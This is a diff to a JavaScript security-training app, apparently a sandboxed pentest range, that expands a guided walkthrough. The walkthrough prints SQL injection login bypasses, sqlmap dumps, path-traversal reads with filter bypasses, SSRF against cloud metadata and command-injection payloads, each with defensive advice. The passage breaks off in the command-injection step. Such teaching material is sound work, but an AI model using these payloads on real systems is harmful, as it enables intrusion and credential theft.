@@ -13,7 +13,7 @@
   const MONO = 'font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace';
   const esc = s => String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
 
-  let wrap = null, panel = null, out = null, inp = null, promptEl = null, room = null, lines = [], hist = [], hi = 0, busy = false;
+  let wrap = null, panel = null, out = null, inp = null, promptEl = null, room = null, lines = [], hist = [], hi = 0, busy = false, repl = null;
   let snapshot = { files: {}, dirs: [] };
   /* Your own typing gets its own colour, so a command is never mistaken for output. Saved for this shell. */
   let userColor = '#7fd1ff', manual = null;
@@ -71,6 +71,7 @@
     '· Every fake website leaks its accounts at /dump/users.csv (names, e-mails, session IPs, passwords): `leaked <host>` prints the table.\n  Plug an IP into `nmap <ip>`, then `ssh user@<ip>` with the leaked password — the PC opens with its own files, work secrets and personal secrets.\n  `exit` comes back to this shell.',
     '· `guide` walks you through that breach step by step — scope, recon, injection, a shell, root, the report — with\n  the exact commands for your target. guide next moves on; guide list shows the ladder.',
     '· `juice start` runs OWASP Juice Shop on this PC and `juice guide` walks the site itself; `app` drives the whole\n  app (tabs, theme, notes, chat, settings, games) and `tools` runs every Toolkit tool from here.',
+    '· `langs` lists the languages this shell really runs: `python3 script.py`, `python3` (a >>> REPL), `node -e`, `sqlite3 "SELECT…"`\n  and Scheme/Prolog/Forth/BASIC — all inside sealed sandboxes in this page, never on the PC and never on the network.',
     '· Every fake website, Browser library and Open Range PC hides a `FLAG{...}`: type  solve FLAG{...}  and it pays the\n  Cyber Desktop practice bank. `solve` alone says where the flags are; `range` lists endless practice PCs to breach.'
   ].map(t => ({ k: t.startsWith('· The ❓') ? 'dim' : 'out', t }));
   /* clearing the screen never leaves it empty: the starting text is what a fresh shell shows */
@@ -92,6 +93,7 @@
     return p[0] === 'app' ? p.slice(1) : p;
   };
   const promptText = () => {
+    if (repl) return repl.prompt;
     if (pcSession) return pcSession.prompt();
     if (breach) return breach.prompt();
     if (mcode && mcode.open && mcode.open()) return mcode.prompt();
@@ -357,6 +359,22 @@
     return out;
   }
   const cwdRel = () => cwdParts().join('/');
+  /* a language command's redirect writes into the shell's own tree (the same writer the range's downloads use) */
+  function writeShellFile(path, text, append) {
+    if (!room || !room.applyFiles) return false;
+    const rel = normRel(path);
+    if (!rel) return false;
+    const before = snapshot;
+    let body = String(text == null ? '' : text);
+    if (append) {
+      const cur = snapshot && snapshot.files ? snapshot.files[PREFIX + rel] : null;
+      body = (cur == null ? '' : String(cur)) + body;
+    }
+    room.applyFiles({ [PREFIX + rel]: body }, []);
+    snapshot = flat(room.snapshot().tree);
+    try { persist(before, snapshot); } catch (e) { }
+    return true;
+  }
   function normRel(p) {
     let s = String(p == null ? '' : p).replace(/\\/g, '/').trim();
     if (!s || s === '.' || s === './') return '';
@@ -1267,6 +1285,7 @@
         TP.setPentestLibraries([{ title: fake.brand + ' · ' + fake.host, name: fake.host, host: fake.host, ip: targetIp, html, cyberSite: at.hub ? null : fake }]);
         breach = TP.makePentest(rangeOptions());
         breachItem = { title: fake.brand + ' (' + fake.host + ')', host: fake.host, site: fake };
+        syncTargetHelp();
         const opened = breach.run('target 1');
         return 'BREACH RANGE · ' + fake.brand + ' · ' + fake.host + ' (' + (targetIp || '10.10.10.5') + ')\n' +
           (at.hub ? '  simulated engagement targeting a local mirror of MoundHub\n'
@@ -1299,6 +1318,7 @@
     TP.setPentestLibraries(libraries);
     breach = TP.makePentest(rangeOptions());
     breachItem = item;
+    syncTargetHelp();
     const opened = breach.run('target ' + item.n);
     return 'BREACH RANGE · ' + item.title + '\n' +
       (html ? '  front page: the page you imported, read from this app (' + fmtBytes(html.length) + ')\n' : '  front page: invented, because a bundled reference library has no single page file\n') +
@@ -1314,6 +1334,7 @@
     if (/^(end|off|stop|leave|quit|exit)$/i.test(words)) {
       const title = breachItem ? breachItem.title : 'the range';
       breach = null; breachItem = null;
+      syncTargetHelp();
       return 'Left the breach range (' + title + '). Back in the mound shell: ls, cat, git … · browser lists the libraries.';
     }
     if (/^(help|\?)$/i.test(words)) {
@@ -1324,6 +1345,7 @@
         'breach end                leave the range and return to the mound shell',
         '',
         'Inside the range: nmap · whatweb · gobuster · nikto · curl · sqlmap · shell · sudo -l · loot · hint · targets · help',
+        'Every command explained for THIS target: 🎯 Target help in the shell toolbar, or Help → 🎯 This target.',
         'Everything is invented and runs inside this page; nothing is sent anywhere.'].join('\n');
     }
     return await startBreach(words);
@@ -1384,225 +1406,500 @@
 
   function walkSteps() {
     const i = walkInfo();
-    const H = i.base, A = i.adminPath, IP = i.ip || '10.10.10.5';
+    const s = i.s || {};
+    const H = i.base, ADMIN = i.adminPath, IP = i.ip || '10.10.10.5';
     const priv = WALK_PRIVESC[i.privesc] || WALK_PRIVESC['sudo-python'];
-    /* a Cyber Desktop target can refuse the tutorial's injection: the walkthrough has to print the way in that
-       actually works on the site in front of the learner, not the way the tutorial floor teaches */
     const sec = i.sec || {};
     const hardLogin = sec.sqliLogin === false;
     const credFile = sec.credPath || sec.secretPath || (sec.leaks && sec.leaks[0] && sec.leaks[0].path) || '/.env';
     const loginPath = sec.loginPath || '/login';
+    const email = s.adminLogin || ('admin@' + H.replace(/^https?:\/\//, ''));
+    const pass = s.adminPass || '';
+    const cookie = s.cookie && /adm_/.test(s.cookie) ? s.cookie : 'session=adm_…';
+    const flagWeb = s.flagWeb || 'FLAG{…}';
+    const flagRoot = s.flagRoot || 'FLAG{…}';
+    const tier = sec.difficulty || s.difficulty || '';
+    const leakPaths = Array.from(new Set(((sec.leaks || []).map(f => f.path).filter(Boolean)).concat([credFile]))).slice(0, 5);
     const steps = [];
     const add = (objective, title, text) => steps.push({ objective, title, lines: String(text).split('\n') });
+    /* the range's own objective list decides which techniques this floor really has; older saves fall back to depth */
+    const listed = id => !s.objectives || !s.objectives.length || s.objectives.some(o => o.id === id);
+    const deep = id => id === 'lfi' ? i.depth > 1 : (id === 'backup' || id === 'ssrf') ? i.depth > 2 : id === 'cmdi' ? i.depth > 3 : true;
+    const want = id => s.objectives && s.objectives.length ? listed(id) : deep(id);
+    const state = objective => objective
+      ? (i.done.has(objective)
+        ? 'STATUS    [x] this objective is already ticked — the commands below are still the evidence trail to keep.'
+        : 'STATUS    [ ] not ticked yet. The range ticks it only when the target really reaches that state.')
+      : 'STATUS    optional: no objective to tick — try it if you want the extra finding.';
+    const where = 'TARGET    ' + H + ' (' + IP + ') · floor ' + i.depth + (tier ? ' · ' + tier : '') +
+      (i.privesc ? ' · privesc ' + i.privesc : '');
 
     add('', 'Scope first: what you may touch, and why that is the lesson', `GOAL      Know exactly what is in scope before you type a single command.
 WHY       Every real engagement starts with scope, not with a scanner. "It is mine" and "I may test it" are different
           statements, and only one of them is signed. The habits you build here are the ones you will have later.
-DO        Ask the range what exists, and look at the objectives it will hold you to.
-TYPE      targets
-TYPE      status
-TYPE      libraries
-EXPECT    three invented hosts (gateway, the web app, a file server), the web app's name and IP, and a list of
-          objectives with nothing ticked. "libraries" lists every page your Browser holds, one target each.
+${where}
+COMMANDS TO TRY
+  targets                       the invented hosts in this range, and which one is the web app
+  status                        every objective this floor holds you to, ticked or not
+  libraries                     the pages your Browser holds, one target each (target <n> switches)
+  depth                         the floor, its tier and the number of objectives
+  map                           the campaign ladder: what each deeper floor adds
+WHAT TO LOOK FOR
+  · three hosts: a gateway (.1), the web app (${IP}) and a file server (.8). Only the web app is in scope.
+  · the objective list starts at [ ] and ends at [x] as the range really observes each step.
+  · "libraries" lists every page you imported; target <number> moves the engagement to another one.
+IF IT DOESN'T WORK
+  · Nothing open yet: type guide — it opens a range on your newest library and starts this ladder.
+  · Wrong target: target <n|host> switches; reset-target rolls fresh secrets on the same floor.
 TEACHES   Scope and rules of engagement, and the difference between discovery (what exists) and exploitation (what
           you are permitted to do about it).
-FIX       (for a defender) keep an asset inventory, and give a tester a scope that names hosts, windows and the one
-          thing they must not touch. A tester who asks for that in writing is on your side.`);
+DEFEND    Keep an asset inventory, and give a tester a scope naming hosts, windows and the one thing they must not
+          touch. A tester who asks for that in writing is on your side.
+${state('')}`);
 
     add('recon', 'First contact: what the box is running', `GOAL      Fingerprint the host before you touch the application.
 WHY       Ports and banners decide everything after this: the framework, the language, the version, and which bug
-          list to read first. Guessing burns the time window you were given.
-DO        Scan the ports, fingerprint the web server, and read its headers for missing protections.
-TYPE      nmap -sV ${IP}
-TYPE      whatweb ${H}
-TYPE      nikto -h ${H}
-EXPECT    ssh on 22, http on 80, https on 443 with nginx and PHP banners (deeper floors add Tomcat on 8080, mysql on
-          3306); whatweb naming nginx, PHP 8.2 and the page title; nikto listing a session cookie without HttpOnly
-          and no X-Frame-Options or Content-Security-Policy.
+          list to read first. Guessing burns the time window you were given. A scan is also evidence: it is the first
+          thing a report cites, and the first thing a defender can compare against their own inventory.
+${where}
+COMMANDS TO TRY
+  nmap -sV ${IP}                start here: open ports and service versions
+  nmap -A ${IP}                 the same, plus default scripts, titles and OS guesses
+  nmap -p- ${IP}                every port, if the short scan looks empty
+  whatweb ${H}                  web server, framework, page title and cookies
+  nikto -h ${H}                 common web findings, missing headers and exposed files
+  curl -sI ${H}                 the headers alone (Server, Set-Cookie, CSP, X-Frame-Options)
+  dig ${s.host || H.replace(/^https?:\/\//, '')}    the DNS answer this invented name gives
+WHAT TO LOOK FOR
+  · 22/tcp open ssh OpenSSH 8.9p1, 80/tcp open http nginx 1.18.0, 443/tcp open ssl/https nginx + PHP 8.2.12${i.depth > 1 ? '\n  · this deeper floor also exposes 3306/tcp mysql and 8080/tcp Tomcat in the full scan' : ''}
+  · whatweb: nginx[1.18.0], PHP[8.2.12], X-Powered-By[PHP/8.2.12], Title[Welcome · ${s.brand || 'the site'}], Cookies[session]
+  · nikto: a session cookie without HttpOnly; X-Frame-Options and Content-Security-Policy absent; ${ADMIN} answers 403;
+    ${leakPaths.length ? 'a readable file at ' + leakPaths[0] + (leakPaths.length > 1 ? ' (and ' + leakPaths.slice(1).join(', ') + ')' : '') : 'no top-level config file is advertised'}
+  · the gateway and files-01 answer too. They are scenery, not targets: writing about what you did NOT touch matters.
+IF IT DOESN'T WORK
+  · "Host seems down": nmap -Pn ${IP} — the range answers ICMP only when asked politely.
+  · whatweb and nikto need a URL/host, not an IP with no scheme: whatweb http://${s.host || H.replace(/^https?:\/\//, '')}
+  · A port you expected is missing: nmap -p- ${IP} scans all 65,535 instead of the default 1,000.
 TEACHES   Fingerprinting, why version banners help an attacker, and which headers a site should be sending.
-FIX       Strip version banners, set HttpOnly and Secure on session cookies, send CSP and X-Frame-Options, and patch
-          or hide the framework version.`);
+DEFEND    Strip version banners, set HttpOnly and Secure on session cookies, send CSP and X-Frame-Options, and patch
+          or hide the framework version.
+${state('recon')}`);
 
     add('paths', 'Content discovery: the pages nobody linked to', `GOAL      Find the routes that are not in the menu.
 WHY       A site is not its navigation. Admin panels, upload endpoints, backups and debug routes are found by asking
-          for them. This is also where a real tester starts to build the map the report needs.
-DO        Read what the site admits to, then brute-force a short directory list.
-TYPE      curl -s ${H}/robots.txt
-TYPE      gobuster dir -u ${H}
-EXPECT    robots.txt disallowing /login, /guestbook and a staff path; gobuster listing /index.html, /login,
-          /guestbook, /profile, /account, /uploads — and one path answering 403 instead of 404. The 403 is the
-          interesting answer: the route exists and is refusing you.
+          for them. This is also where a real tester starts to build the map the report needs. The interesting answer
+          is not always 200: a 403 says "this exists and refuses you", which is a finding in itself.
+${where}
+COMMANDS TO TRY
+  curl -s ${H}/robots.txt               what the site admits to, in its own words
+  gobuster dir -u ${H}                  directory brute force (the range bundles a wordlist)
+  ffuf -u ${H}/FUZZ -w words.txt        the same idea, with FUZZ where the word goes
+  dirb ${H}                             another spelling of the same scan
+  curl -s -o /dev/null ${H}${ADMIN}     ask for the staff route directly and read the status
+  curl -s ${H}/sitemap.xml              a second map some sites hand out
+WHAT TO LOOK FOR
+  · robots.txt: /login, /account${sec.robotsLeaksAdmin ? ' and ' + ADMIN : ' (the staff route is deliberately left out)'}
+  · the scan listing /index.html, /login, /guestbook, /profile, /account, /uploads, and ${ADMIN} with Status: 403
+  · ${ADMIN} is the route to remember: it is unlinked, it exists, and it is refusing an anonymous request.
+  · any other 200 that looks like a backup, config or debug page — note the path and its size.
+IF IT DOESN'T WORK
+  · gobuster with no wordlist: this range supplies one; on a real box add -w /usr/share/wordlists/dirb/common.txt
+  · Everything 404s: check the scheme (http://) and that you are scanning ${H}, not the gateway.
+  · The 403 is not a dead end. It becomes a 200 after the login objective — that is the next step.
 TEACHES   Content discovery, and reading status codes as information: 404 = no such thing, 403 = it is there.
-FIX       Do not rely on obscurity. Put authentication in front of admin routes, rate-limit directory brute force, and
-          keep robots.txt free of anything you actually care about — it is a map you are handing out.`);
+DEFEND    Do not rely on obscurity. Put authentication in front of admin routes, rate-limit directory brute force, and
+          keep robots.txt free of anything you actually care about — it is a map you are handing out.
+${state('paths')}`);
 
     add('login', hardLogin ? 'Broken authentication: the hardened login' : 'Broken authentication: the login builds a SQL string',
       `GOAL      Get a staff session, using whatever this site actually left exposed.
 WHY       ${hardLogin
-        ? 'This site uses parameterised queries, so the apostrophe that breaks the tutorial login is just a character here.\n          That is the correct behaviour — the way in is somewhere else: a configuration file left in the web root, a\n          developer note or an old bundle. Reading it is reconnaissance, not an exploit.'
-        : 'The login glues your input straight into its SQL. If your input is SQL syntax, it becomes part of the\n          query: the password comparison is no longer a check, it is a suggestion. The range even prints the query\n          it is about to run on a failed attempt — that is the vulnerability in plain sight.'}
-DO        ${hardLogin
-        ? 'Read the leaked configuration, then sign in with the staff email and password it prints.'
-        : 'Send a username that closes the string and makes the WHERE clause always true.'}
-TYPE      ${hardLogin ? 'curl -s ' + H + credFile : 'curl "' + H + `/login?u=' OR 1=1-- &p=x"`}
-TYPE      ${hardLogin ? 'curl "' + H + loginPath + '?u=<ADMIN_EMAIL>&p=<ADMIN_PASSWORD>"' : 'sqlmap -u "' + H + '/login?u=1&p=1" --batch --dump'}
-EXPECT    ${hardLogin
-        ? 'the file prints ADMIN_PATH, ADMIN_EMAIL and ADMIN_PASSWORD; the login then answers 302 Found, Location: /account\n          and Set-Cookie: session=adm_… — a real staff session, obtained without breaking the SQL layer.'
-        : 'HTTP/1.1 302 Found, Location: /account and Set-Cookie: session=adm_… — the app has signed you in as admin.\n          sqlmap prints the users table with names, emails, roles and API keys: the same finding, automated.'}
+        ? 'This site uses parameterised queries, so the apostrophe that breaks the tutorial login is just a character here.\n          That is correct behaviour. The way in is somewhere else: a configuration file left in the web root, a developer\n          note or an old bundle. Reading it is reconnaissance, not an exploit — and it is the more common real-world\n          mistake, because a secret that ships once can never be un-shipped.'
+        : 'The login glues your input straight into its SQL. If your input is SQL syntax, it becomes part of the query:\n          the password comparison stops being a check and becomes a suggestion. The range prints the query it is about\n          to run on a failed attempt — the vulnerability is visible in its own error message.'}
+${where}
+COMMANDS TO TRY
+${hardLogin
+        ? `  curl -s ${H}${credFile}
+     the leaked file first: read it before you try to guess anything
+  curl -s ${H}${credFile} | grep -i "admin\|pass\|secret"
+     narrow the file down to the lines that matter
+  curl -s "${H}${loginPath}?u=${email}&p=${pass || 'PASSWORD_FROM_THE_FILE'}"
+     the sign-in with the staff account the file prints
+  curl -s -X POST -d "u=${email}&p=${pass || 'PASSWORD_FROM_THE_FILE'}" ${H}${loginPath}
+     the same sign-in as a form POST, if you prefer the way a browser sends it
+  open ${H}${loginPath} in the Browser tab, then use the email and password by hand
+PYTHON (the same sign-in, made from the Python sandbox)
+  python3 -c "import requests; r = await requests.get('${loginPath}?u=${encodeURIComponent(email)}&p=${encodeURIComponent(pass || 'PASSWORD_FROM_THE_FILE')}'); print(r.status_code, r.reason)"
+     requests reaches this range's fake server, so the session and the objective tick are the same`
+        : `  curl "${H}${loginPath}?u=' OR 1=1-- &p=x"
+     the manual bypass: close the quote, make the WHERE true, comment out the password check
+  sqlmap -u "${H}${loginPath}?u=1&p=1" --batch --dump
+     the same bug, automated: it prints the users table
+  curl -s -X POST -d "u=admin'-- &p=x" ${H}${loginPath}
+     the form-encoded version, for when the query string is filtered
+  curl -s "${H}/api/search?q='"
+     a second injection point, if this site exposes the search API
+PYTHON (the same request, made from the Python sandbox)
+  python3 -c "import requests; r = await requests.get('${loginPath}?u=%27+OR+1%3D1--+&p=x'); print(r.status_code, r.reason)"
+     requests reaches this range's fake server, so the bypass, the cookie and the objective tick are identical`}
+WHAT TO LOOK FOR
+${hardLogin
+        ? '  · the leaked file naming ADMIN_PATH, ADMIN_EMAIL and ADMIN_PASSWORD: ' + (leakPaths.length ? leakPaths.join(', ') : credFile) + '\n  · the email and password it prints are ' + email + ' and ' + (pass || '(read them from the file)') + '\n  · HTTP/1.1 302 Found, Location: /account and Set-Cookie: session=adm_… — a real staff session, without breaking SQL.\n  · sqlmap will say "does not appear to be injectable" on this target. That is the correct answer; do not force it.'
+        : '  · HTTP/1.1 302 Found, Location: /account and Set-Cookie: session=adm_… — the app has signed you in as admin.\n  · sqlmap printing the users table with id, name, email, role and api_key: the finding and its evidence in one run.\n  · a SQL error before the bypass means the query is visible: read it and adjust the quote count.'}
+IF IT DOESN'T WORK
+  · The quote is eaten by the shell: use single quotes around the whole URL, or URL-encode it as %27.
+  · "curl: (7) Failed to connect": the target is not ${H}; run targets and copy the web app exactly.
+  · Hardened site: if ${credFile} is 404, try the other files in ${leakPaths.length ? leakPaths.join(', ') : 'robots.txt and the staff route'}.
+  · Soft site: if the injection returns a 200 login page instead of 302, the query may use double quotes; try
+    u=admin"-- &p=x, then fall back to sqlmap and read its payload list.
 TEACHES   ${hardLogin
-        ? 'Defence works: prepared statements stop the injection completely. The finding here is the leaked artefact that\n          hands over the staff account anyway — the same outcome through a different, equally common mistake.'
-        : 'Injection: data crossing into code. The apostrophe closes the quote, OR 1=1 makes the condition true for every\n          row, and -- comments out the password check that followed. sqlmap is not magic; it is this, tried with many\n          spellings of the same idea.'}
-FIX       Parameterised queries (prepared statements) for every statement, never string building. Validate and
+        ? 'Defence works: prepared statements stop the injection completely. The finding is the leaked artefact that hands\n          over the staff account anyway — the same outcome through a different, equally common mistake.'
+        : 'Injection: data crossing into code. The apostrophe closes the quote, OR 1=1 makes the condition true for every\n          row, and -- comments out the password check. sqlmap is not magic; it is this, tried with many spellings.'}
+DEFEND    Parameterised queries (prepared statements) for every statement, never string building. Validate and
           allowlist input. Log failed logins. Treat the sign-in as a security boundary, not a form. Keep configuration
-          files out of the web root and rotate any credential that ever sat in one.`);
+          files out of the web root and rotate any credential that ever sat in one.
+${state('login')}`);
 
-    add('staff', 'Session trust: using the session you just obtained', `GOAL      Reach the page the session was supposed to protect.
+    add('staff', 'Session trust: using the session you just obtained', `GOAL      Reach the page the session was supposed to protect, and capture the proof it leaks.
 WHY       Authentication proved who you are. Authorisation decides what you may see — and this app never asks again:
-          it trusts the cookie it minted from its own broken query. One request and the staff area answers.
-DO        Ask for the staff route, then repeat it with the cookie spelled out, so you can see exactly what the server
-          is trusting.
-TYPE      curl ${H}${A}
-TYPE      curl -I -b "session=adm_…" ${H}${A}
-EXPECT    200 with the staff dashboard: user rows, their API keys, and a "deploy secret" standing in for the real one
-          such a page usually leaks. Without the cookie the same URL answers 403 and tells you what it did receive —
-          a badly behaved server, and a useful one.
+          it trusts the cookie it minted from its own broken query. One request and the staff area answers. A staff
+          page that renders secrets, API keys and user rows is the highest-value page on most small sites.
+${where}
+COMMANDS TO TRY
+  curl -s ${H}${ADMIN}                          with the session your login stored
+  curl -s -b "${cookie}" ${H}${ADMIN}           spell the cookie out, to see exactly what the server trusts
+  curl -s -I ${H}${ADMIN}                       headers only: status and content type
+  curl -s -b "session=guest" ${H}${ADMIN}       the same URL with a user cookie: expect 403
+PYTHON (the same page, read from the sandbox)
+  python3 -c "import requests; r = await requests.get('${ADMIN}'); print(r.status_code); print(r.text[-160:])"
+WHAT TO LOOK FOR
+  · 200 OK with the staff dashboard: user rows, their api_key values, and a "Deploy secret" block.
+  · the deploy secret is this floor's web flag: ${flagWeb}
+  · without a staff cookie the same URL answers 403 and tells you what it received — a badly behaved server, and a
+    useful one.
+  · submit the flag while it is on screen: solve ${flagWeb}
+IF IT DOESN'T WORK
+  · 403: the cookie was not carried (use -b) or it is still "session=guest" — do the login step again.
+  · 302 to /login: the session expired or the site is hardened; sign in again with the credentials from the leak.
+  · The page renders but the flag is empty: capture what it actually prints; that text is the evidence.
 TEACHES   Broken access control, the number-one finding in real web assessments: the check is on the front end, the
           cookie is unsigned or long-lived, and every secret an admin needs is rendered into one page.
-FIX       Authorise every request on the server (role, not just session), sign and rotate session cookies, give admin
-          sessions a short life, and never render deploy secrets into a page.`);
+DEFEND    Authorise every request on the server (role, not just session), sign and rotate session cookies, give admin
+          sessions a short life, and never render deploy secrets into a page.
+${state('staff')}`);
 
-    add('', 'Broken access control, part two: read another user by number', `GOAL      Read somebody else's record by changing one number in a URL.
-WHY       /profile?id=1 asks the database for that row and hands it back. The page never asks whether the row is
-          yours. No injection, no password, no clever syntax — just an object reference the server trusts.
-DO        Fetch two different ids and compare.
-TYPE      curl -s "${H}/profile?id=1"
-TYPE      curl -s "${H}/profile?id=2"
-EXPECT    JSON for admin (id 1) and guest (id 2): names, emails, roles and API keys, with no session at all.
-TEACHES   IDOR / BOLA — the everyday API bug. It is why banks use opaque ids, and why "the URL had a number in it" is
-          not a defence.
-FIX       Authorise the object as well as the request: compare the row's owner to the session subject, use
-          unguessable ids, and alert on sequential enumeration.`);
-
-    if (i.depth > 1) add('lfi', 'Path traversal: make a download read outside its folder', `GOAL      Use a helpful download endpoint to read a file you were never meant to read.
+    if (want('lfi')) add('lfi', 'Path traversal: make a download read outside its folder', `GOAL      Use a helpful download endpoint to read a file you were never meant to read.
 WHY       The file name comes from the query string and is joined onto a base directory. ../ walks back out of that
-          directory, so the server will read anything its own user can read — including its configuration.
-DO        Walk up to /etc, then to the site's own config.
-TYPE      curl -s "${H}/download?file=../../../../etc/passwd"
-TYPE      curl -s "${H}/download?file=../../../../var/www/config.php"
-EXPECT    /etc/passwd listing root, www-data and maint; config.php with the database password, the deploy API key and
-          the admin password hash. /root/flag.txt answers 403 with an open_basedir message — the one boundary that
-          held, which is itself the lesson.
-TEACHES   Path traversal: a download link is a file-read primitive. And a reminder that the fix is one canonical
-          path check, not a list of "bad" strings.
-FIX       Resolve the requested name against a fixed base, reject anything that escapes it (realpath + prefix test),
-          store downloads outside the app, and run the web user with no access to /etc or /root.`);
+          directory, so the server will read anything its own user can read — including its configuration. The number
+          of ../ segments is not magic: keep adding until you reach the root, then walk down.
+${where}
+COMMANDS TO TRY
+  curl -s "${H}/download?file=../../../../etc/passwd"                 first proof: a file every Linux box has
+  curl -s "${H}/download?file=../../../../var/www/config.php"         the app's own config, with its passwords
+  curl -s "${H}/download?file=../../../../home/maint/.bash_history"   the admin's habits, often the privesc clue
+  curl -s "${H}/download?file=../../../../etc/nginx/nginx.conf"       the web server's root and limits
+  curl -s "${H}/download?file=....//....//etc/passwd"                 a filter bypass, if plain ../ is stripped
+PYTHON (the same read, from the sandbox)
+  python3 -c "import requests; r = await requests.get('/download?file=../../../../etc/passwd'); print(r.text[:160])"
+WHAT TO LOOK FOR
+  · /etc/passwd: root, www-data and maint — and a shell for maint, which means a human logs in.
+  · config.php: $DB_PASS=…Pg!, a deploy key sk_live_…, and the admin hash 5f4dcc3b5aa765d61d8327deb882cf99.
+  · .bash_history: "sudo -l", "psql -U web", "sudo /usr/bin/python3 /opt/backup.py" — the routine that gives root.
+  · /root/flag.txt answers 403 with an open_basedir message: the one boundary that held. That contrast is the lesson.
+IF IT DOESN'T WORK
+  · 404: count the directories. From /var/www, four ../ reach /. Try five, then six.
+  · The server strips ../: try ....//....//, ..%2f..%2f, or an absolute path in the parameter.
+  · The file is binary: pipe it through strings, or ask for a text file instead.
+TEACHES   Path traversal: a download link is a file-read primitive. And a reminder that the fix is one canonical path
+          check, not a list of "bad" strings.
+DEFEND    Resolve the requested name against a fixed base, reject anything that escapes it (realpath + prefix test),
+          store downloads outside the app, and run the web user with no access to /etc or /root.
+${state('lfi')}`);
 
-    if (i.depth > 2) add('backup', 'Secrets in artefacts: the leaked backup', `GOAL      Find a copy of the site that was left where anyone can download it.
+    if (want('backup')) add('backup', 'Secrets in artefacts: the leaked backup', `GOAL      Find a copy of the site left where anyone can download it, and read the secrets out of it.
 WHY       .zip, .git, .env, editor swap files and "site-backup-final" folders are the application's own source and
-          secrets handed out as static files. Nothing needs exploiting: the secrets are simply published.
-DO        Pull the archive and look inside it as text.
-TYPE      curl -o backup.zip ${H}/backup.zip
-TYPE      strings backup.zip
-EXPECT    app/config.php and app/.env with the JWT signing secret, the database password and the admin password hash.
-TEACHES   Artefacts as leaks — and why a secret that ever shipped can never be un-shipped. This is how real
-          engagements turn a web bug into an account takeover.
-FIX       Never publish build output or backups; keep .git and .env outside the webroot; rotate every secret that was
-          ever in one; add a deployment check that fails on archive files in the webroot.`);
+          secrets handed out as static files. Nothing needs exploiting: the secrets are simply published. This is how
+          a web finding becomes an account takeover or a forged session.
+${where}
+COMMANDS TO TRY
+  curl -o backup.zip ${H}/backup.zip             save the archive into this shell
+  ls -l backup.zip                               prove it is really on your disk
+  unzip -l backup.zip                            list the entries without extracting
+  unzip -p backup.zip app/.env                   print one entry: the environment file
+  unzip -p backup.zip app/config.php             print the JWT secret and the admin path
+  strings backup.zip | grep -i "secret\\|pass\\|admin"    scan the raw bytes when unzip is not available
+  cat backup.zip | head -c 400                   if it is not a real zip, read what it actually is
+WHAT TO LOOK FOR
+  · entries app/.env, app/config.php, app/routes.php, db/schema.sql and README.md.
+  · app/.env: DB_PASSWORD=…Pg!, ADMIN_HASH=5f4dcc…, JWT_SECRET=…jwt
+  · app/config.php: $ADMIN_PATH='${ADMIN}', and a TODO saying the archive should have been moved out of the web root.
+  · db/schema.sql: the users table and the admin hash. Crack it with  john <hash>  or  hashcat -m 0 <hash>  —
+    the range's joke password is "password", which is exactly the finding.
+IF IT DOESN'T WORK
+  · 403: the archive lives behind the staff session. Finish the login and staff steps, then retry with -b.
+  · 404: try ${H}${ADMIN}/backup.zip and ${H}/backup.tar.gz.
+  · unzip says "cannot find zipfile": the download saved nothing (check the URL) or the file is an HTML error page.
+TEACHES   Artefacts as leaks — and why a secret that ever shipped can never be un-shipped.
+DEFEND    Never publish build output or backups; keep .git and .env outside the webroot; rotate every secret that was
+          ever in one; add a deployment check that fails on archive files in the webroot.
+${state('backup')}`);
 
-    if (i.depth > 2) add('ssrf', 'SSRF: make the server fetch something you cannot reach', `GOAL      Make the server request an address from inside its own network.
+    if (want('ssrf')) add('ssrf', 'SSRF: make the server fetch something you cannot reach', `GOAL      Make the server request an address from inside its own network.
 WHY       /fetch takes a URL and requests it for you. From where the server sits, 169.254.169.254 is the cloud metadata
-          service: instance identity, role name and temporary credentials. A web bug becomes cloud access.
-DO        Point the fetcher at the metadata endpoint.
-TYPE      curl -s "${H}/fetch?url=http://169.254.169.254/latest/meta-data/"
-EXPECT    JSON with the instance id, the role and an access-key id — the material that leads to the rest of the cloud.
+          service: instance identity, role name and temporary credentials. A web bug becomes cloud access, and the
+          request comes from an address the cloud trusts.
+${where}
+COMMANDS TO TRY
+  curl -s "${H}/fetch?url=http://169.254.169.254/latest/meta-data/"
+  curl -s "${H}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  curl -s "${H}/fetch?url=http://127.0.0.1:3306/"        prove it can reach a local service, not just the internet
+  curl -s "${H}/fetch?url=file:///var/www/config.php"    the same primitive, reading a local file
+PYTHON (the same fetch, from the sandbox)
+  python3 -c "import requests; r = await requests.get('/fetch?url=http://169.254.169.254/latest/meta-data/'); print(r.text[:200])"
+WHAT TO LOOK FOR
+  · JSON naming the instance id, the role and an access-key id — the material that leads to the rest of the cloud.
+  · a database banner from 127.0.0.1:3306, proving the request really came from inside.
+  · file:// returning the config file: the fetcher did not restrict the scheme.
+IF IT DOESN'T WORK
+  · 400/404: URL-encode the nested URL (:// becomes %3A%2F%2F) if the server parses it strictly.
+  · The metadata root is empty: try /latest/meta-data/iam/security-credentials/ and /latest/user-data/.
+  · Blocked by an allowlist: note it as a defended control, and try a hostname the allowlist does contain.
 TEACHES   SSRF, and why "block localhost" is not an allowlist. The dangerous addresses are the ones the server can reach
           and you cannot.
-FIX       Allowlist outbound destinations, block link-local ranges, require IMDSv2, and give the instance the smallest
-          role that still works.`);
+DEFEND    Allowlist outbound destinations, block link-local ranges, require IMDSv2, and give the instance the smallest
+          role that still works.
+${state('ssrf')}`);
 
-    if (i.depth > 3) add('cmdi', 'Command injection: a field that was meant to hold a hostname', `GOAL      Run your own command through the ping tool.
+    if (want('cmdi')) add('cmdi', 'Command injection: a field that was meant to hold a hostname', `GOAL      Run your own command through the ping tool.
 WHY       The endpoint shells out: ping <host>. A semicolon ends the ping and starts your command, which the server
-          runs as the web user. No upload, no exploit code — just punctuation.
-DO        Break out of the argument and run id, then read the config.
-TYPE      curl -s "${H}/ping?host=127.0.0.1%3Bid"
-TYPE      curl -s "${H}/ping?host=127.0.0.1%3Bcat%20/var/www/config.php"
-EXPECT    the normal ping output followed by uid=33(www-data), then the config file with its passwords.
-TEACHES   OS command injection, and the difference between a shell string and an argument list. The %3B is just a
-          URL-encoded semicolon: the browser was never the protection.
-FIX       Never call a shell from an application: pass an argument array (execFile/spawn with shell:false), validate
-          the host with a real parser, and run the service in a container that holds nothing it does not need.`);
+          runs as the web user. No upload, no exploit code — just punctuation. The browser was never the protection;
+          the semicolon only has to survive URL encoding.
+${where}
+COMMANDS TO TRY
